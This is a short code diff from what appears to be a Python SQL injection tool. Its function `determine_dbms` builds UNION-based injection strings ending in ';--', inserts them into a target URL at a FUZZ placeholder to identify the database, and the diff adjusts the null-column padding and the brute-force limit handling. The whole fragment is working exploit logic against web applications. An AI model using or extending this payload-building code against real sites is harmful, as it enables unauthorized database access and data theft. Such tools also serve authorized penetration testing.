@@ -49,11 +49,10 @@ def determine_dbms(url, success_str, error_str, columns=1, brute_force=False):
     brute_force_limit = 20
 
     if brute_force and brute_force_limit <= columns:
-        error("Brute force limit reached")
-        return exit(2)
+        return None
 
     for version_string in DBMS_VERSION_STRING:
-        nulls = "".join([",null" for _ in range(0, columns)])
+        nulls = "".join([",null" for _ in range(0, columns-1)])
         poison = "' UNION " + version_string.value + nulls + ";--"
 
         target = url.replace("FUZZ", poison)
